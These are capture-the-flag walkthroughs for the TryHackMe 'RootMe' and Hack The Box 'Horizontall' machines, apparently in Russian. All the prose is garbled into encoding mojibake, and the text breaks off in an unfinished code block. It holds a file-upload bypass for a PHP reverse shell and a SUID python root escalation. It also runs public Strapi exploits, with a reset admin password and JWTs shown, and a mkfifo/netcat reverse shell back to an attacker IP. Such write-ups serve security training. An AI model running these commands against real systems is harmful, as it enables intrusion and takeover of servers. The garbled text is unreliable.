

# RootMe

**–ü–ª–æ—à–∞–¥–∫–∞:** https://tryhackme.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy

–°–Ω–∞—á–∞–ª–æ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ—Å—å –∫ VPN, –ø–æ—Å–ª–µ —á–µ–≥–æ —Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–π—Ç–µ –º–∞—à–∏–Ω—É –∏ –∑–∞–ø—É—Å—Ç–∏—Ç–µ –µ–≥–æ —á—Ç–æ–±—ã –º—ã –º–æ–≥–ª–∏ –Ω–∞—á–∞—Ç—å –ø—Ä–∏—Å—Ç—É–ø–∏—Ç—å –∫ –∑–∞–¥–∞—á–µ.
## –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ

–ö–æ–Ω–µ—á–Ω–æ –∂–µ –Ω–∞—á–∞–ª–æ —ç—Ç–æ —Ä–∞–∑–≤–µ–¥–∫–∞. –ù–∞—á–Ω–µ–º —Å–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è nmap.

```
nmap -sC -sV -oN nmap/rootme <MACHINE_IP>
```

- -sC : —Å—Ü–µ–Ω–∞—Ä–∏–∏ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
- -sV : –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–µ—Ä—Å–∏–∏
- -oN: –≤—ã–≤–æ–¥ –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ –∫–∞—Ç–∞–ª–æ–≥–µ ¬´nmap¬ª, –∫–æ—Ç–æ—Ä—ã–π –≤—ã —Å–æ–∑–¥–∞–ª–∏ —Ä–∞–Ω–µ–µ.

![[Pasted image 20230710163247.png]]

![[Pasted image 20230710161210.png]]

–û—Ç–∫—Ä—ã—Ç–æ 2 –ø–æ—Ä—Ç–∞:  

  22/ssh ‚Äî OpenSSH 7.6p1  
  80/http ‚Äî Apache httpd 2.4.29  
  
–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –û–° ‚Äî Linux

## –ü–æ–∏—Å–∫ —Å–∫—Ä—ã—Ç—ã—Ö –∫–∞—Ç–æ–ª–æ–≥–æ–≤

–¢–µ–ø–µ—Ä—å –º—ã –ø–æ–ª—É—á–∞–µ–º —Å–æ–≤–µ—Ç –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å —Å–∞–π—Ç, —Ä–∞–±–æ—Ç–∞—é—â–∏–π –Ω–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–µ, —Å –ø–æ–º–æ—â—å—é gobuster. –≠—Ç–æ—Ç –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –Ω–∞–π–¥–µ—Ç —Å–∫—Ä—ã—Ç–µ –∫–∞—Ç–∞–ª–æ–≥–∏ –Ω–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–µ. –î–ª—è —ç—Ç–æ–π –∑–∞–¥–∞—á–∏ —è –∏—Å–ø–æ–ª—å–∑—É—é —Å–ø–∏—Å–æ–∫ —Å–ª–æ–≤ common.txt. –í parrotsec os (–∏, –µ—Å–ª–∏ —è –ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø–æ–º–Ω—é, –≤ —Ç–æ–º –∂–µ –º–µ—Å—Ç–µ –≤ kali linux) —ç—Ç–æ—Ç —Å–ø–∏—Å–æ–∫ —Å–ª–æ–≤ –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤ ¬´/usr/share/wordlists/dirb/common.txt¬ª. –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è gobuster:

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://target>
```


![[Pasted image 20230710164351.png]]

![[Pasted image 20230710164323.png]]

–†–∞–∑–Ω–∏—Ü–∞ –º–µ–∂–¥—É –ø—Ä–∏–º–µ—Ä–∞–º–∏ –≤—ã –≤ —Ç–æ–º —á—Ç–æ –æ–¥–∏–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–ª–æ–≤–∞—Ä—å dirb, –∞ –¥—Ä—É–≥–æ–π dirbuster. –ú–æ–∂–Ω–æ —Ç–∞–∫–∂–µ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Å–ª–æ–≤–∞—Ä—è–º–∏ —Å–∞–º–æ–≥–æ gobuster –∏–ª–∏ –∂–µ wfuzz.

–í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ –º—ã –Ω–∞—Ö–æ–¥–∏–º –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π –∫–∞—Ç–∞–ª–æ–≥ **/panel**. –ü–µ—Ä–µ—Ö–æ–¥–∏–º –ø–æ –∞–¥—Ä–µ—Å—É 

![[Pasted image 20230710164852.png]]

–ö–æ–≥–¥–∞ –º—ã –∑–∞—Ö–æ–¥–∏–º –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É /panel/, –Ω–∞—Å –≤—Å—Ç—Ä–µ—á–∞–µ—Ç —Ñ–æ—Ä–º–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞. –î–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π —Å—Ü–µ–Ω–∞—Ä–∏–π –æ–±—Ä–∞—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏, –Ω–∞–ø–∏—Å–∞–Ω–Ω—ã–π –Ω–∞ php. –î–ª—è —ç—Ç–æ–π –∑–∞–¥–∞—á–∏ –º—ã –∑–∞–≥—Ä—É–∑–∏–º —Å–∫—Ä–∏–ø—Ç –æ–±—Ä–∞—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏ php. –Ø —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É—é —Å–∫—Ä–∏–ø—Ç pentestmonkey php-reverse-shell.php, —á—Ç–æ–±—ã –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –ø–æ–ª—É—á–∏—Ç—å –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É —Å –ø–æ–º–æ—â—å—é netcat.  

Git –°—Å—ã–ª–∫–∞ –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Å–∫—Ä–∏–ø—Ç–∞ –∏–ª–∏ –∫–ª–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª–µ: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

–°–¥–µ–ª–∞–π—Ç–µ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Å–∫—Ä–∏–ø—Ç php-reverse-shell —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã:  

```
chmod +x php_reverse_shell.php 
```

–û—Ç–∫—Ä–æ–π—Ç–µ —Å–∫—Ä–∏–ø—Ç –≤ —Ä–µ–¥–∞–∫—Ç–æ—Ä–µ –∏ –∏–∑–º–µ–Ω–∏—Ç–µ $ip –∏ $port –Ω–∞ IP-–∞–¥—Ä–µ—Å –∏ –ø–æ—Ä—Ç –≤–∞—à–µ–≥–æ —Ö–æ—Å—Ç-–∫–æ–º–ø—å—é—Ç–µ—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –≤—ã —Ö–æ—Ç–∏—Ç–µ –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç—å.

![[Pasted image 20230710165219.png]]

–ò—Ç–∞–∫, –≤—ã –Ω–∞—Å—Ç—Ä–æ–∏–ª–∏ —Å–∫—Ä–∏–ø—Ç. –ú—ã –ø—Ä–æ–¥–æ–ª–∂–∏–º –∏ –∑–∞–≥—Ä—É–∑–∏–º —Å–∫—Ä–∏–ø—Ç.

![[Pasted image 20230710165231.png]]

–ó–∞–≥—Ä—É–∑–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å!! –≠—Ç–æ –ø–æ—Ç–æ–º—É, —á—Ç–æ php –Ω–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ –∑–∞–≥—Ä—É–∂–∞—Ç—å. –ü–æ—ç—Ç–æ–º—É –º—ã –ø–æ—Å—Ç–∞—Ä–∞–µ–º—Å—è –æ–±–æ–π—Ç–∏ –∑–∞–≥—Ä—É–∑–∫—É, –∏–∑–º–µ–Ω–∏–≤ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞. –ß—Ç–æ–±—ã –ª—É—á—à–µ –ø–æ–Ω—è—Ç—å –æ–±—Ö–æ–¥ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞, —Å–º. –ø—Ä–∏–º–µ—Ä—ã –Ω–∏–∂–µ:

![[Pasted image 20230710165306.png]]

![[Pasted image 20230710165315.png]]

–ü–µ—Ä–µ–∏–º–µ–Ω—É–µ–º —Å–∫—Ä–∏–ø—Ç —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã:  

```
mv php_reverse_shell.php php_reverse_shell.phtml
```

–ü–æ–ø—Ä–æ–±—É–µ–º —Å–Ω–æ–≤–∞ –∑–∞–≥—Ä—É–∑–∏—Ç—å —Å–∫—Ä–∏–ø—Ç.

## –ó–∞–≥—Ä—É–∑–∫–∞ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ (File Upload Vulnerabilities)

![[Pasted image 20230710165422.png]]

## –ü–æ–ª—É—á–µ–Ω–∏–µ –æ–±–æ–ª–æ—á–∫–∏

–ú—ã —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∑–∏–ª–∏ —Å–∫—Ä–∏–ø—Ç. –ü–µ—Ä–µ—Ö–æ–¥—è –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —à–∞–≥—É, –º—ã –∑–∞–ø—É—Å—Ç–∏–º –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç–µ–ª—å –Ω–∞ netcat. –Ø –∏—Å–ø–æ–ª—å–∑—É—é –ø–æ—Ä—Ç 9001, –∏ —è —É–∂–µ –≤—Å—Ç–∞–≤–∏–ª —Ç–æ—Ç –∂–µ –ø–æ—Ä—Ç –≤–º–µ—Å—Ç–µ —Å IP-–∞–¥—Ä–µ—Å–æ–º —Ö–æ—Å—Ç–∞ –º–æ–µ–π –º–∞—à–∏–Ω—ã –≤ —Å—Ü–µ–Ω–∞—Ä–∏–π, –∫–æ—Ç–æ—Ä—ã–π –º—ã –∑–∞–≥—Ä—É–∑–∏–ª–∏.

![[Pasted image 20230710165519.png]]


–ú—ã —Å–ª—É—à–∞–µ–º –ø–æ—Ä—Ç 9001.  
–¢–µ–ø–µ—Ä—å –Ω–∞–º –Ω—É–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –æ–±–æ–ª–æ—á–∫—É, –≤—ã–ø–æ–ª–Ω–∏–≤ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ <MACHINE_IP>/uploads/.

–ó–∞—Ç–µ–º –º—ã –ø–µ—Ä–µ—Ö–æ–¥–∏–º –≤ –∫–∞—Ç–∞–ª–æ–≥ /uploads –Ω–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–µ (–º—ã –Ω–∞—à–ª–∏ —ç—Ç–æ—Ç –∫–∞—Ç–∞–ª–æ–≥ –ø—Ä–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–∏ gobuster!). –¢–∞–º –º—ã –Ω–∞–∂–∏–º–∞–µ–º –Ω–∞ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –º—ã —Ç–æ–ª—å–∫–æ —á—Ç–æ –∑–∞–≥—Ä—É–∑–∏–ª–∏. –ó–∞—Ç–µ–º –º—ã –ø–µ—Ä–µ–∫–ª—é—á–∞–µ–º—Å—è –æ–±—Ä–∞—Ç–Ω–æ –Ω–∞ —Ç–µ—Ä–º–∏–Ω–∞–ª, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–º –±—ã–ª –Ω–∞—à –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç–µ–ª—å netcat, –∏ –≤–∏–¥–∏–º, —á—Ç–æ —É –Ω–∞—Å –µ—Å—Ç—å –æ–±–æ–ª–æ—á–∫–∞!


![[Pasted image 20230710165539.png]]

–í—ã–ø–æ–ª–Ω–∏—Ç–µ —Å–∫—Ä–∏–ø—Ç –∏ –≤–µ—Ä–Ω–∏—Ç–µ—Å—å, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å –≤–∞—à –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç–µ–ª—å netcat.

![[Pasted image 20230710165551.png]]

–í—É–∞–ª—è!!  –ú—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–∏–ª–∏ —Å–Ω–∞—Ä—è–¥. –ù–û –æ–±–æ–ª–æ—á–∫–∞ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–∞–±–∏–ª—å–Ω–æ–π –æ–±–æ–ª–æ—á–∫–æ–π. –ö–∞–∫ –ø–æ–ª—É—á–∏—Ç—å —Å—Ç–∞–±–∏–ª—å–Ω—É—é –æ–±–æ–ª–æ—á–∫—É? –ü–æ–∑–≤–æ–ª—å—Ç–µ –º–Ω–µ –ø–æ–∫–∞–∑–∞—Ç—å –ø—É—Ç—å.

![[Pasted image 20230710165708.png]]

```python
import pty;pty.spawn("/bin/bash")
```

–î–∞–≤–∞–π—Ç–µ –æ—Ö–æ—Ç–∏–º—Å—è –∑–∞ –Ω–∞—à–∏–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–º —Ñ–ª–∞–≥–æ–º! 
–ù–µ–º–Ω–æ–≥–æ –æ—Å–º–æ—Ç—Ä–µ–≤—à–∏—Å—å, —è –Ω–∞—Ö–æ–∂—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π —Ñ–ª–∞–≥ –≤ –∫–∞—Ç–∞–ª–æ–≥–µ ¬´/var/www¬ª.

![[Pasted image 20230710170244.png]]

–î–∞–∂–µ –º–æ–∂–Ω–æ –∏—Å–∫–∞—Ç—å —Ñ–∞–π–ª **user.txt** —Å –ø.–º. –∫–æ–º–∞–Ω–¥—ã **find:**

![[Pasted image 20230710170556.png]]

–ö–æ–º–∞–Ω–¥–∞ find –æ–∫–∞–∑–∞–ª–∞—Å—å –≤–µ—Å—å–º–∞ –ø–æ–ª–µ–∑–Ω–æ–π –∏ –¥–æ–≤–æ–ª—å–Ω–æ –ª–µ–≥–∫–æ –Ω–∞—à–ª–∞ —Ñ–∞–π–ª user.txt, —á—Ç–æ —Å—ç–∫–æ–Ω–æ–º–∏–ª–æ –Ω–∞–º –≤—Ä–µ–º—è –Ω–∞ —Ä—É—á–Ω–æ–π –ø–æ–∏—Å–∫ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è —Ñ–ª–∞–≥–∞.

![[Pasted image 20230710170618.png]]
## –ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

–ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π ‚Äî —ç—Ç–æ –≤–µ—Å–µ–ª–æ! –ü–æ—Å–∫–æ–ª—å–∫—É —É –Ω–∞—Å –Ω–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –ø–∞—Ä–æ–ª—è, –Ω–∞–º –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç –Ω–∞–π—Ç–∏ –¥—Ä—É–≥–æ–π —Å–ø–æ—Å–æ–± –ø–æ–ª—É—á–∏—Ç—å –Ω–∞—à –¥—Ä–∞–≥–æ—Ü–µ–Ω–Ω—ã–π –∫–æ—Ä–Ω–µ–≤–æ–π —Ñ–ª–∞–≥. –ú—ã –∏—â–µ–º –≤—Å–µ —Ñ–∞–π–ª—ã —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ–º suid. 

–ß—Ç–æ–±—ã –Ω–∞–π—Ç–∏ —Ñ–∞–π–ª—ã —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ–º SUID, –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É:  

```bash
find / -type f -user root -perm -4000 2>/dev/null
```

```bash
find / -perm -u=s -type f 2>/dev/null
```


![[Pasted image 20230710174756.png]]

–¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å –∫–∞–∫–∞—è-—Ç–æ —Å—Ç—Ä–∞–Ω–Ω–∞—è –≤–µ—â—å –∑–¥–µ—Å—å PYTHON!!

![[Pasted image 20230710174950.png]]

–≠—Ç–æ –¥–∞–µ—Ç –Ω–∞–º —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ —Å –Ω–∞–±–æ—Ä–æ–º suid. –¢–æ—Ç, –∫–æ—Ç–æ—Ä—ã–º –º—ã –º–æ–∂–µ–º –∑–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª—è—Ç—å, —ç—Ç–æ /usr/bin/python. –ó–∞—Ö–æ–¥–∏–º –Ω–∞ [https://gtfobins.github.io/](https://gtfobins.github.io/) –∏ –∏—â–µ–º python. –û—Ç–ª–∏—á–Ω–æ, –º—ã –Ω–∞—à–ª–∏ SUID priv esc! 

#4.1 –ü–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤ —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ–º SUID, –∫–∞–∫–æ–π —Ñ–∞–π–ª —è–≤–ª—è–µ—Ç—Å—è —Å—Ç—Ä–∞–Ω–Ω—ã–º?  
–û—Ç–≤–µ—Ç: /usr/bin/python

–£ –Ω–∞—Å –µ—Å—Ç—å /usr/bin/python —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ–º SUID, –º—ã –ø–æ–ø—ã—Ç–∞–µ–º—Å—è –ø–æ–≤—ã—Å–∏—Ç—å –Ω–∞—à–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏.  
–ú–æ–µ –ø–µ—Ä–≤–æ–µ –º–µ—Å—Ç–æ ‚Äî –ø–µ—Ä–µ–π—Ç–∏ –Ω–∞ [https://gtfobins.github.io/](https://gtfobins.github.io/) –∏ –Ω–∞–π—Ç–∏ –≤–æ–∑–º–æ–∂–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π.  

–ù–∞–π–¥–∏—Ç–µ –ø–∏—Ç–æ–Ω –≤ —Å—Ç—Ä–æ–∫–µ –ø–æ–∏—Å–∫–∞.

![[Pasted image 20230710175041.png]]

![[Pasted image 20230710175055.png]]

–í—Å–µ–≥–¥–∞ —á–∏—Ç–∞–π—Ç–µ –æ–ø–∏—Å–∞–Ω–∏–µ –ø–µ—Ä–µ–¥ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ–º –∫–æ–º–∞–Ω–¥. –ú—ã –º–æ–∂–µ–º –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–µ—Ä–≤—É—é –∫–æ–º–∞–Ω–¥—É, —Ç–∞–∫ –∫–∞–∫ –¥–≤–æ–∏—á–Ω—ã–π —Ñ–∞–π–ª —É–∂–µ –∏–º–µ–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ SUID. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –≤—Ç–æ—Ä—É—é –∫–æ–º–∞–Ω–¥—É –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –≤ –æ–±–æ–ª–æ—á–∫—É, —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —Ä–∞–±–æ—Ç–∞–µ—Ç –ª–∏ –æ–Ω–∞. –£–¥–∞–ª–∏—Ç–µ ./ –∏–∑ –∫–æ–º–∞–Ω–¥—ã –∏ –∑–∞–ø—É—Å—Ç–∏—Ç–µ –µ–µ.

```bash
python -c ‚Äòimport os; os.execl(‚Äú/bin/sh‚Äù, ‚Äúsh‚Äù, ‚Äú-p‚Äù)‚Äô
```

–î–ê!! –≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —Ä–∞–±–æ—Ç–∞–µ—Ç.  –ú—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–≤—ã—Å–∏–ª–∏ –Ω–∞—à–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏. –ú—ã –º–æ–∂–µ–º –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å, —á—Ç–æ –º—ã root.

–≠—Ç–æ –¥–µ–ª–∞–µ—Ç –Ω–∞—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º root –≤ —Å–∏—Å—Ç–µ–º–µ. –¢–µ–ø–µ—Ä—å –º—ã –º–æ–∂–µ–º –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Ñ–∞–π–ª –∫–æ—Ä–Ω–µ–≤–æ–≥–æ —Ñ–ª–∞–≥–∞ –∏ –≤—Å–µ!

–ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ –∫–æ—Ä–Ω–µ–≤–æ–π –∫–∞—Ç–∞–ª–æ–≥, –∏ –º—ã –Ω–∞–π–¥–µ–º –Ω–∞—à –∫–æ—Ä–Ω–µ–≤–æ–π —Ñ–ª–∞–≥.

![[Pasted image 20230710175243.png]]

–ú—ã —É—Å–ø–µ—à–Ω–æ –≤–∑–ª–æ–º–∞–ª–∏ –º–∞—à–∏–Ω—É –∏ –Ω–∞—à–ª–∏ –æ–±–∞ —Ñ–ª–∞–≥–∞ üö©

--- 

# Horizontall

**–ü–ª–æ—à–∞–¥–∫–∞:** https://hackthebox.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy
## –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ 

```
[kali@kali ~]$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.105
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
```

–ù–∏—á–µ–≥–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–≥–æ –≤ –∫–∞—Ç–∞–ª–æ–≥–∞—Ö –∏–ª–∏ —Ñ–∞–π–ª–∞—Ö –Ω–µ –ø–æ—è–≤–ª—è–µ—Ç—Å—è, –ø–æ—ç—Ç–æ–º—É —è –ø–æ–ø—Ä–æ–±–æ–≤–∞–ª —Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ —Ö–æ—Å—Ç—ã.

```
[kali@kali ~]$ ffuf -w ~/wordlist/subdomains-top1million-110000.txt:FUZZ -u http://horizontall.htb/ -H 'Host: FUZZ.horizontall.htb' -fs 194 -v -t 200
...
[Status: 200, Size: 901, Words: 43, Lines: 2]
| URL | http://horizontall.htb/
    * FUZZ: www

[Status: 200, Size: 413, Words: 76, Lines: 20]
| URL | http://horizontall.htb/
    * FUZZ: api-prod
```

–¢–µ–ø–µ—Ä—å –¥–∞–≤–∞–π—Ç–µ —Ñ–∞–∑–∑–∏–Ω–≥ API-–ø—Ä–æ–¥—É–∫—Ç–∞ VHOST.

```
[kali@kali ~]$ ffuf -w ~/wordlist/directories.txt -u http://horizontall.htb/FUZZ -v -t 200
...
[Status: 200, Size: 854, Words: 98, Lines: 17]
| URL | http://api-prod.horizontall.htb/admin
    * FUZZ: admin
```

## –ê–Ω–∞–ª–∏–∑ —É—è–∑–≤–∏–º–æ—Å—Ç–∏

–ï—Å–ª–∏ –º—ã –ø—Ä–æ–≤–µ—Ä–∏–º —Å—Ç—Ä–∞–Ω–∏—Ü—É, –º—ã –æ–±–Ω–∞—Ä—É–∂–∏–º —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤—Ö–æ–¥–∞ –≤ Strapi –∏ –≤—ã–ø–æ–ª–Ω–∏–º –ø–æ–∏—Å–∫ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π Strapi –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –Ω–∞—à–ª–∏ [https://www.exploit-db.com/exploits/50239](https://www.exploit-db.com/exploits/50239) , –ø–æ—ç—Ç–æ–º—É –¥–∞–≤–∞–π—Ç–µ –∑–∞–ø—É—Å—Ç–∏–º –µ–µ. (–≤—ã –º–æ–∂–µ—Ç–µ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –≤–µ—Ä—Å–∏—é Strapi –≤ [http://api-prod.horizontall.htb/admin/init](http://api-prod.horizontall.htb/admin/init) )

```
[kali@kali ~]$python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNzQwODgwLCJleHAiOjE2NDQzMzI4ODB9.luB-yz5Zzm5mWVVSJBL34oBFohrjjTdSqtRV7m9hvvY
```

–í –ø–æ–∏—Å–∫–∞—Ö —ç—Ç–æ–≥–æ —ç–∫—Å–ø–ª–æ–π—Ç–∞ —è –Ω–∞—à–µ–ª –µ—â–µ –æ–¥–∏–Ω, –¥–ª—è –∫–æ—Ç–æ—Ä–æ–≥–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è —Ç–æ–∫–µ–Ω JWT, –ø–æ—ç—Ç–æ–º—É –¥–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º —Å–æ–∑–¥–∞—Ç—å —Å –µ–≥–æ –ø–æ–º–æ—â—å—é –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É [https://www.exploit-db.com/exploits/50238](https://www.exploit-db.com/exploits/50238)

## –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–∏—Å—Ç–µ–º–µ

```
[kali@kali ~]$ nc -lnvvvp 5555
...
[kali@kali ~]$ python3 50238.py http://api-prod.horizontall.htb eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNTg2NjM5LCJleHAiOjE2NDQxNzg2Mzl9.ZUJptHdyrooFivW8npIG_JVsBKGrimccmY6QC14mGv4 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.243 5555 >/tmp/f" 10.10.14.243

[+] Successful operation!!!
```

–î–∞–≤–∞–π—Ç–µ —Ç–æ–≥–¥–∞ –ø–æ–ª—É—á–∏–º —Ñ–ª–∞–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
strapi@horizontall:~/myapi$ cat home/developer/user.txt
```

## –ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–µ–ª–∏–≥–∏–π

```
strapi@horizontall:~/myapi$ netstat -antlp | grep LISTEN
netstat -antlp | grep LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1835/node /usr/bin/
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

–ï—Å–ª–∏ –º—ã –ø–æ–ø—ã—Ç–∞–µ–º—Å—è –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –ø–æ—Ä—Ç—ã —Å –ø–æ–º–æ—â—å—é Curl, –º—ã –æ–±–Ω–∞—Ä—É–∂–∏–º —á—Ç–æ-—Ç–æ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –≤ –ø–æ—Ä—Ç–µ 8000, –ø–æ—ç—Ç–æ–º—É –¥–∞–≤–∞–π—Ç–µ –≤—ã–ø–æ–ª–Ω–∏–º —É–¥–∞–ª–µ–Ω–Ω—É—é –ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—é –ø–æ—Ä—Ç–æ–≤, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å —ç—Ç–æ –∏–∑ –Ω–∞—à–µ–≥–æ –±—Ä–∞—É–∑–µ—Ä–∞.

```
